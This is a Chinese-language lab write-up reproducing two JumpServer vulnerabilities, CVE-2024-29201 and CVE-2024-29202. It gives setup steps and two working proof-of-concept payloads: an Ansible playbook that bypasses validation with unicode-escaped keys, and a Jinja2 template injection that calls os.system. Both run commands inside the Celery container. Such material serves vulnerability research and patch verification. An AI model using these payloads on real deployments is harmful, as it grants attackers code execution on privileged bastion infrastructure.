## JumpServer(CVE-2024-29201)远程代码执行漏洞&(CVE-2024-29202)Jinin2模板注入漏洞

JumpServer 是广受欢迎的开源堡垒机，是符合 4A 规范的专业运维安全审计系统。

CVE-2024-29201 远程代码执行漏洞，该漏洞可绕过 JumpServer 的 Ansible 中的输入验证机制，在 Celery 容器中执行任意代码
CVE-2024-29202 Jinin2 模板注入漏洞，该漏洞是有 JumpServer 的 Ansible 中存在 Jinja2 模板注入，在 Celery 容器中执行任意代码。

##  影响版本
```v3.0.0 <= JumpServer <= v3.10.6```

## 环境搭建

首先下载官方提供的脚本https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh，下载后编辑 quick_start.sh，将脚本中的 VERSION 修改为存在漏洞版本，如：V3.10.6。如下图所示：

![image](https://github.com/wy876/POC/assets/139549762/8c7db9cf-a5e9-442c-9538-eae5eafd4fcd)

等待服务启动，启动完成后访问 http://ip/

![image](https://github.com/wy876/POC/assets/139549762/0e374e28-50ba-4905-a7ea-e8257e33a3ec)

JumpServer 默认账号密码为 admin/admin

接着进入后台添加资产，具体步骤如下图所示：

![image](https://github.com/wy876/POC/assets/139549762/995bf6d3-1d57-47a1-8194-ec4effdea392)

添加资产后需要测试是否添加成功，点击资产后面的 更多-测试 进行测试。

资产添加完成后添加用户，如下图所示：

![image](https://github.com/wy876/POC/assets/139549762/808c64ab-2daa-4080-b092-c83cb2426004)

最后为用户分配一个资产，如下图所示：

![image](https://github.com/wy876/POC/assets/139549762/f0ff0aad-8916-4ef1-800d-46b2f1725bb5)

至此环境搭建完成。

## CVE-2024-29201

登陆创建的普通用户账号，进入 作业中心-模板管理 添加一个 Playbook

![image](https://github.com/wy876/POC/assets/139549762/ba8cb7cd-abcd-4a76-92a9-0c5e8e064888)

点击创建的 Playbook 名称，切换到 工作空间，输入以下内容：

```
[{
     "name": "RCE playbook",
     "hosts": "all",
     "tasks": [
       {
         "name": "this runs in Celery container",
         "shell": "id > /tmp/pwnd",
         "\u0064elegate_to": "localhost"
} ],
     "vars": {
     "ansible_\u0063onnection": "local"
     }
}]
```

![image](https://github.com/wy876/POC/assets/139549762/b78e8eed-c3a3-46c1-a5d8-ac60d68cb2a6)

点击保存。保存完成之后切换到 作业管理 页面，创建一个新的 Playbook 作业

![image](https://github.com/wy876/POC/assets/139549762/b22c7efc-22a3-46f9-a275-eec2b3ba1257)

playbook 作业详情如下：

![image](https://github.com/wy876/POC/assets/139549762/9f727ad1-2f03-497a-8592-42b7f5229561)

点击保存并运行作业

![image](https://github.com/wy876/POC/assets/139549762/c902efd5-6646-4001-957b-16e414407f75)

结果如下

![image](https://github.com/wy876/POC/assets/139549762/9169c220-a91d-471f-8bb1-69fd8c4d3fd4)

进入 Celery 容器，查看 tmp 目录下是否存在 pwnd 文件

![image](https://github.com/wy876/POC/assets/139549762/650bf6b6-d7df-4fb8-9c00-c4d62a37d1d2)


## CVE-2024-29202

与 CVE-2024-29201类似，进入 作业中心-模板管理 添加一个 Playbook，在 工作空间 输入的内容为：
```
- name: |
       {% for x in ().__class__.__base__.__subclasses__() %}
         {% if "warning" in x.__name__ %}
           {{
             x()._module.__builtins__["__import__"]("os").system("id > /tmp/pwnd2")
           }}
         {%endif%}
       {%endfor%}
```
添加完成后，同样进入作业管理页面创建并运行 Playbook 作业。运行结果如下

![image](https://github.com/wy876/POC/assets/139549762/9b2ded4f-2db9-4910-9831-49305e8eef51)

![image](https://github.com/wy876/POC/assets/139549762/d44f6e3d-c9bb-4e5f-9fa8-f636c6210b09)


## 漏洞来源
- https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/
- https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj
- https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch
